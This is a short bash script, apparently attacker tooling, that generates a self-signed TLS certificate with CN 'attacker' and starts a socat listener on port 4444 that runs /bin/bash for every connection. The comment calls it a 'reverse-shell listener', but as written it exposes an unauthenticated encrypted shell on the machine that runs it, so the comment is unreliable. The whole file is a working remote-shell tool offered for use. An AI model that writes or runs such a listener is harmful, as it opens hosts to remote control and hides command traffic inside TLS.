#!/bin/bash
# Generate self‑signed certificate (if not present) and start SSL reverse‑shell listener
CERT_DIR="/opt/attacker/certs"
CERT_FILE="$CERT_DIR/cert.pem"
KEY_FILE="$CERT_DIR/key.pem"

mkdir -p "$CERT_DIR"
if [ ! -f "$CERT_FILE" ] || [ ! -f "$KEY_FILE" ]; then
  echo "[*] Generating self‑signed certificate..."
  openssl req -new -x509 -days 365 -nodes \
    -subj "/CN=attacker" \
    -out "$CERT_FILE" -keyout "$KEY_FILE"
fi

echo "[*] Starting socat SSL listener on port 4444"
exec socat OPENSSL-LISTEN:4444,reuseaddr,cert="$CERT_FILE",key="$KEY_FILE",verify=0,fork EXEC:/bin/bash
